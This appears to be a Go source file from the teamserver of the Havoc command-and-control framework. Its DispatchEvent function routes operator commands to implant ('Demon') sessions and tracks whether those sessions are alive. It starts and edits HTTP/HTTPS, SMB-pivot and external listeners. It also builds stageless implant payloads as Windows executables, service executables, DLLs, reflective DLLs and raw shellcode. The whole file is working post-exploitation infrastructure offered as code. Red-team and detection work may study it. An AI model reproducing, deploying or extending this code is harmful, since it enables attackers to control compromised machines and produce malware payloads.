package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/builder"
	"Havoc/pkg/events"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	"Havoc/pkg/packager"
)

func (t *Teamserver) DispatchEvent(pk packager.Package) {
	switch pk.Head.Event {

	case packager.Type.Session.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Session.MarkAsDead:
			if AgentID, ok := pk.Body.Info["AgentID"]; ok {
				for i := range t.Agents.Agents {
					if t.Agents.Agents[i].NameID == AgentID {

						if val, ok := pk.Body.Info["Marked"]; ok {
							if val == "Dead" {
								t.Agents.Agents[i].Active = false
								t.AgentHasDied(t.Agents.Agents[i])
							} else if val == "Alive" {
								t.Agents.Agents[i].Active = true
							}
							t.AgentUpdate(t.Agents.Agents[i])
						}

					}
				}
			}

			break

		case packager.Type.Session.Input:
			var (
				job       *agent.Job
				command   = 0
				AgentType = "Demon"
				err       error
				DemonID   string
				found     = false
			)

			if agentID, ok := pk.Body.Info["DemonID"].(string); ok {
				DemonID = agentID
			} else {
				logger.Debug("AgentID [" + agentID + "] not found")
				return
			}

			for i := range t.Agents.Agents {

				if t.Agents.Agents[i].NameID == DemonID {
					found = true

					// handle demon session input
					// TODO: maybe move to own function ?
					if t.Agents.Agents[i].Info.MagicValue == agent.DEMON_MAGIC_VALUE {

						var (
							Message = new(map[string]string)
							Console = func(AgentID string, Message map[string]string) {
								var (
									out, _ = json.Marshal(Message)
									pk     = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE, string(out))
								)

								t.EventAppend(pk)
								t.EventBroadcast("", pk)
							}
						)

						if val, ok := pk.Body.Info["CommandID"]; ok {

							if pk.Body.Info["CommandID"] == "Python Plugin" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
									backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								return

							} else if pk.Body.Info["CommandID"] == "Teamserver" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								var Command = pk.Body.Info["Command"].(string)

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								if err = t.Agents.Agents[i].TeamserverTaskPrepare(Command, Console); err != nil {
									Console(t.Agents.Agents[i].NameID, map[string]string{
										"Type":    "Error",
										"Message": "Failed to create Task: " + err.Error(),
									})
									return
								}

								return

							} else {

								// TODO: move to own function.
								command, err = strconv.Atoi(val.(string))
								if err != nil {

									logger.Error("Failed to convert CommandID to integer: " + err.Error())
									command = 0

								} else {
									*Message = make(map[string]string)

									var ClientID string
									ClientID = ""
									t.Clients.Range(func(key, value any) bool {
										client := value.(*Client)
										if client.Username == pk.Head.User {
											ClientID = client.ClientID
											return false
										}
										return true
									})

									job, err = t.Agents.Agents[i].TaskPrepare(command, pk.Body.Info, Message, ClientID, t)
									if err != nil {
										Console(t.Agents.Agents[i].NameID, map[string]string{
											"Type":    "Error",
											"Message": "Failed to create Task: " + err.Error(),
										})
										return
									}

									if job != nil {
										t.Agents.Agents[i].AddJobToQueue(*job)
									}

									if t.Agents.Agents[i].Pivots.Parent != nil {
										logr.LogrInstance.AddAgentInput("Demon", t.Agents.Agents[i].NameID, pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									} else {
										logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
									}

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									if Message != nil {
										Console(t.Agents.Agents[i].NameID, *Message)
									}

									return
								}
							}
						}

					} else {

						for _, a := range t.Service.Agents {
							if a.MagicValue == fmt.Sprintf("0x%x", t.Agents.Agents[i].Info.MagicValue) {

								// Set agent type
								AgentType = a.Name

								if pk.Body.Info["CommandID"] == "Python Plugin" {
									logr.LogrInstance.AddAgentInput(AgentType, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
										backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									return

								} else {
									// Send command to agent service
									a.SendTask(pk.Body.Info, t.Agents.Agents[i].ToMap())

									// log agent input
									logr.LogrInstance.AddAgentInput(a.Name, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
								}

							}
						}
					}
					break
				}
			}

			if found == false {
				logger.Error(fmt.Sprintf("The AgentID %s was not found", DemonID))
				return
			}

			if pk.Head.OneTime == "true" {
				return
			}

			var backups = map[string]interface{}{
				"TaskID":      pk.Body.Info["TaskID"].(string),
				"DemonID":     DemonID,
				"CommandID":   "",
				"CommandLine": pk.Body.Info["CommandLine"].(string),
				"AgentType":   AgentType,
			}

			if _, ok := pk.Body.Info["CommandID"].(string); ok {
				backups["CommandID"] = pk.Body.Info["CommandID"]
			}

			for k := range pk.Body.Info {
				delete(pk.Body.Info, k)
			}

			pk.Body.Info = backups

			t.EventAppend(pk)
			t.EventBroadcast(pk.Head.User, pk)
		}

	case packager.Type.Chat.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Chat.NewMessage:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewSession:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewListener:
			t.EventBroadcast("", pk)
			break

		}

	case packager.Type.Listener.Type:
		switch pk.Body.SubEvent {

		case packager.Type.Listener.Add:

			var Protocol = pk.Body.Info["Protocol"].(string)

			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:

				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
					BehindRedir:  t.Profile.Config.Demon.TrustXForwardedFor,
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				if err := t.ListenerStart(handlers.LISTENER_HTTP, Config); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_PIVOT_SMB:
				var (
					SmdConfig handlers.SMBConfig
					found     bool
				)

				SmdConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				SmdConfig.PipeName, found = pk.Body.Info["PipeName"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				if err := t.ListenerStart(handlers.LISTENER_PIVOT_SMB, SmdConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_EXTERNAL:
				var (
					ExtConfig handlers.ExternalConfig
					found     bool
				)

				ExtConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					ExtConfig.Name = ""
				}

				ExtConfig.Endpoint, found = pk.Body.Info["Endpoint"].(string)
				if !found {
					logger.Error("Listener SMB Pivot: Endpoint not specified")
					return
				}

				if err := t.ListenerStart(handlers.LISTENER_EXTERNAL, ExtConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			default:

				// check if the service endpoint is up and available
				if t.Service != nil {

					for _, listener := range t.Service.Listeners {

						if Protocol == listener.Name {

							var (
								ListenerName string
								err          error
							)

							// retrieve the listener name
							if val, ok := pk.Body.Info["Name"]; ok {
								ListenerName = val.(string)
							}

							// try to start the listener.
							if err = listener.Start(pk.Body.Info); err != nil {
								t.EventListenerError(ListenerName, err)
							}

							// append the listener to the teamserver listener array
							t.Listeners = append(t.Listeners, &Listener{
								Name: ListenerName,
								Type: handlers.LISTENER_SERVICE,
								Config: handlers.Service{
									Service: listener,
									Info:    pk.Body.Info,
								},
							})

							// break from this switch
							return
						}

					}

				}

				// didn't found the protocol type so just abort
				logger.Error("Listener Type not found: ", Protocol)

				break
			}

			break

		case packager.Type.Listener.Remove:

			if val, ok := pk.Body.Info["Name"]; ok {
				t.ListenerRemove(val.(string))

				var p = events.Listener.ListenerRemove(val.(string))

				t.EventAppend(p)
				t.EventBroadcast("", p)
			}

			break

		case packager.Type.Listener.Edit:

			var Protocol = pk.Body.Info["Protocol"].(string)
			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:
				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				t.ListenerEdit(handlers.LISTENER_HTTP, Config)

				var p = events.Listener.ListenerEdit(handlers.LISTENER_HTTP, &Config)

				t.EventAppend(p)
				t.EventBroadcast("", p)

				break

			}

			break
		}

	case packager.Type.Gate.Type:

		switch pk.Body.SubEvent {
		case packager.Type.Gate.Stageless:
			var (
				AgentType      = pk.Body.Info["AgentType"].(string)
				ListenerName   = pk.Body.Info["Listener"].(string)
				Arch           = pk.Body.Info["Arch"].(string)
				Format         = pk.Body.Info["Format"].(string)
				Config         = pk.Body.Info["Config"].(string)
				SendConsoleMsg func(MsgType, Message string)
				ClientID       string
			)

			t.Clients.Range(func(key, value any) bool {
				Client := value.(*Client)
				if Client.Username == pk.Head.User {
					ClientID = Client.ClientID
					return false
				}
				return true
			})

			SendConsoleMsg = func(MsgType, Message string) {
				err := t.SendEvent(ClientID, events.Gate.SendConsoleMessage(MsgType, Message))
				if err != nil {
					logger.Error("Couldn't send Event: " + err.Error())
					return
				}
			}

			if AgentType == "Demon" {
				go func() {
					var ConfigMap = make(map[string]any)

					err := json.Unmarshal([]byte(Config), &ConfigMap)
					if err != nil {
						logger.Error("Failed to Unmarshal json to object: " + err.Error())
						return
					}

					var PayloadBuilder = builder.NewBuilder(builder.BuilderConfig{
						Compiler64: t.Settings.Compiler64,
						Compiler86: t.Settings.Compiler32,
						Nasm:       t.Settings.Nasm,
						DebugDev:   t.Flags.Server.DebugDev,
						SendLogs:   t.Flags.Server.SendLogs,
					})

					PayloadBuilder.ClientId = ClientID

					if PayloadBuilder.ClientId == "" {
						logger.Error("Couldn't find the Client")
						return
					}

					PayloadBuilder.SendConsoleMessage = SendConsoleMsg

					err = PayloadBuilder.SetConfig(Config)
					if err != nil {
						return
					}

					if Arch == "x64" {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X64)
					} else {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X86)
					}

					var Ext string
					if Arch == "x64" {
						Ext = ".x64"
					} else {
						Ext = ".x86"
					}
					logger.Debug(Format)
					if Format == "Windows Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_EXE)
						Ext += ".exe"
					} else if Format == "Windows Service Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_SERVICE_EXE)
						Ext += ".exe"
					} else if Format == "Windows Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_DLL)
						Ext += ".dll"
					} else if Format == "Windows Reflective Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_REFLECTIVE_DLL)
						Ext += ".dll"
					} else if Format == "Windows Shellcode" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_RAW_BINARY)
						Ext += ".bin"
					} else {
						logger.Error("Unknown Format: " + Format)
						return
					}

					for i := 0; i < len(t.Listeners); i++ {
						if t.Listeners[i].Name == ListenerName {
							PayloadBuilder.SetListener(t.Listeners[i].Type, t.Listeners[i].Config)
						}
					}

					PayloadBuilder.SetExtension(Ext)

					if t.Profile.Config.Demon != nil && t.Profile.Config.Demon.Binary != nil {
						PayloadBuilder.SetPatchConfig(t.Profile.Config.Demon.Binary)
					}

					if PayloadBuilder.Build() {
						pal := PayloadBuilder.GetPayloadBytes()
						if len(pal) > 0 {
							err := t.SendEvent(PayloadBuilder.ClientId, events.Gate.SendStageless("demon"+Ext, pal))
							if err != nil {
								logger.Error("Error while sending event: " + err.Error())
								return
							}
							PayloadBuilder.DeletePayload()
						}
					}
				}()
			} else {
				// send to Services
				for _, Agent := range t.Service.Agents {
					if Agent.Name == AgentType {
						var ConfigMap = make(map[string]any)

						err := json.Unmarshal([]byte(Config), &ConfigMap)
						if err != nil {
							logger.Error("Failed to Unmarshal json to object: " + err.Error())
							SendConsoleMsg("Error", "Failed to Unmarshal json to object: "+err.Error())
							return
						}

						var Options = map[string]any{
							"Listener": t.ListenerGetInfo(ListenerName),
							"Arch":     Arch,
							"Format":   Format,
						}

						Agent.SendAgentBuildRequest(ClientID, ConfigMap, Options)
					}
				}

			}
		}
	}
}
